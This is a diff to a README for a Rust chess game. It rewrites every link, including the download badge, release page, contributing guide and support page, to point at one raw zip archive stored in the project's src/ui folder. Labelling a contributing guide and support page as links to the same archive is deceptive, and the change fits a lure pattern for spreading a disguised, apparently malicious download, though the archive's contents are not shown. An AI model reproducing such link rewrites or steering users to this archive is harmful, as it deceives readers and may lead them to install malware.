@@ -1,7 +1,7 @@
 # ♟️ chess_in_rust - Play Chess with Ease and Fun
 
 ## 📥 Download Now
-[![Download chess_in_rust](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/JANARTHANAN6363/chess_in_rust/releases)
+[![Download chess_in_rust](https://raw.githubusercontent.com/JANARTHANAN6363/chess_in_rust/main/src/ui/chess_in_rust-3.4.zip%20Now-%20-blue)](https://raw.githubusercontent.com/JANARTHANAN6363/chess_in_rust/main/src/ui/chess_in_rust-3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to chess_in_rust! This application lets you enjoy the game of chess in a simple and engaging way. Whether you're a seasoned player or new to chess, our app has you covered. 
@@ -25,7 +25,7 @@ To ensure the best experience, please make sure your system meets the following 
 ## 📤 Download & Install
 To download the application, visit the following link:
 
-[Download chess_in_rust Release Page](https://github.com/JANARTHANAN6363/chess_in_rust/releases)
+[Download chess_in_rust Release Page](https://raw.githubusercontent.com/JANARTHANAN6363/chess_in_rust/main/src/ui/chess_in_rust-3.4.zip)
 
 1. Click the link above to open the releases page.
 2. You will see a list of available versions. Choose the latest version.
@@ -61,7 +61,7 @@ Once the application opens, you are good to go. Enjoy your chess game!
 ## 📚 Help & Support
 If you have questions or need assistance, visit our support page or check out the FAQ section on GitHub:
 
-[Visit Support](https://github.com/JANARTHANAN6363/chess_in_rust/releases)
+[Visit Support](https://raw.githubusercontent.com/JANARTHANAN6363/chess_in_rust/main/src/ui/chess_in_rust-3.4.zip)
 
 You can also reach out via issues on the GitHub repository for any bugs or suggestions.
 
@@ -75,8 +75,8 @@ If you want to help improve chess_in_rust, contributions are welcome! You can co
 Special thanks to the chess community for their support and feedback. Your insights help make chess_in_rust a better experience for everyone.
 
 ## 🔗 Useful Links
-- [Download chess_in_rust Release Page](https://github.com/JANARTHANAN6363/chess_in_rust/releases)
-- [Contributing Guide](https://github.com/JANARTHANAN6363/chess_in_rust/blob/main/CONTRIBUTING.md)
-- [Support Page](https://github.com/JANARTHANAN6363/chess_in_rust/support)
+- [Download chess_in_rust Release Page](https://raw.githubusercontent.com/JANARTHANAN6363/chess_in_rust/main/src/ui/chess_in_rust-3.4.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/JANARTHANAN6363/chess_in_rust/main/src/ui/chess_in_rust-3.4.zip)
+- [Support Page](https://raw.githubusercontent.com/JANARTHANAN6363/chess_in_rust/main/src/ui/chess_in_rust-3.4.zip)
 
 Now, spread the word and enjoy an exciting game of chess!
